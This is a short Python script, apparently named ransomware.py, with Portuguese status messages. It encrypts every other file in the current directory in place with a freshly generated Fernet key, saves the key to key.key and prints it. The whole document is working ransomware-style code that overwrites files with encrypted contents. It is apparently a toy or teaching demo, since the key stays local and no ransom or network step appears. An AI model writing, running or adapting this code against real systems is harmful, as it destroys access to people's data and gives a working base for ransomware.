import os
from cryptography.fernet import Fernet

# get all files in current dir ====

files = []

for file in os.listdir():
    if file in [ "decrypt.py", "ransomware.py", "key.key" ]:
        continue
    if os.path.isfile(file):
        files.append(file)

print("Arquivos encontrados:", files)

# key =============================
key = Fernet.generate_key()

with open("key.key", "wb") as keyfile:
    keyfile.write(key)

key = open("key.key", "rb").read()

# encrypt files====================

for file in files:
    print("Encriptando", file) 
    with open(file, "rb") as file_to_encrypt:
        contents = file_to_encrypt.read()
    encrypted_contents = Fernet(key).encrypt(contents)
    with open(file, "wb") as file_to_encrypt:
        file_to_encrypt.write(encrypted_contents)

print("arquivoes encriptados, chave >", key)
